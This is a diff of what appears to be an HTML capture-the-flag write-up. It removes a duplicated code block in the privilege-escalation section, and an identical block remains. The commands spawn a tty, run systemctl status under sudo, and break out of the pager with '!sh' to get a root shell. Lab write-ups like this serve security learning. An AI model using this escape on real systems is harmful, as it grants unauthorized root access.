@@ -269,9 +269,6 @@ The root cause of this vulnerability is a command injection flaw present in the 
 </span></span></code></pre></div><p><img src="https://github.com/ACHUX21/Writeups/assets/130113878/465aa762-6566-4472-bb11-f89508166417" alt="image"></p>
 <h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>it&rsquo;s time to focus on privilege escalation.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
-</span></span><span style="display:flex;"><span>sudo  /usr/bin/systemctl status trail.service
-</span></span><span style="display:flex;"><span>!sh
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
 </span></span><span style="display:flex;"><span>sudo  /usr/bin/systemctl status trail.service
 </span></span><span style="display:flex;"><span>!sh
